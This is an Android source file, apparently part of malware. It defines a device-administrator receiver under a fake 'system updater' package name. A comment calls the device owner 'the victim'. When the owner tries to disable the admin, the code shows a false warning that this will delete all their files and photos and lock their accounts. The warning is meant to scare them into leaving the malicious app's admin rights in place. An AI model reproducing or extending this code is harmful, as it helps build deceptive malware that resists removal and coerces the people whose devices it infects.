package com.sys.updater;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        Toast.makeText(context, "System Admin Enabled", Toast.LENGTH_SHORT).show();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Had l'message li ghadi yban l'victim mnin y-bghi y-tfi l'Admin
        return "WARNING: Disabling this system component will delete all your personal files, photos, and lock your accounts. Are you sure you want to proceed?";
    }
}
